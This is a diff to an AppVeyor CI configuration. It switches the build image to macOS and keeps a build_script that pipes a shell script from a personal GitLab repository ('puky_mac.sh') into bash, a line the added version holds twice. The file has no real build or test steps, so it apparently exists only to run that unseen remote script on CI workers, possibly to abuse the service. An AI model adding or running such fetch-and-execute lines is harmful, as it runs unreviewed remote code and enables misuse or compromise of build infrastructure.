@@ -1,13 +1,29 @@
 version: 1.0.{build}
-image:
-- macOS-BigSur
-- Ubuntu2004
-build:
-  parallel: true
-  verbosity: minimal
-test:
-  categories:
-  - - Test1
-  - - Test2
-build_script:
-- sh: curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
+stack: jdk 15
+
+skip_commits:
+  files:
+    - docs/*
+    - '**/*.md'
+
+environment:
+  matrix:
+
+  - job_name: Test1
+    appveyor_build_worker_image: macOS-BigSur
+
+matrix:
+  fast_finish: true
+
+init:
+  - appveyor version
+  - echo Some common logic here...
+
+for:
+    matrix:
+      only:
+        - job_name: Test1
+        
+    build_script:
+    - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
+    - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
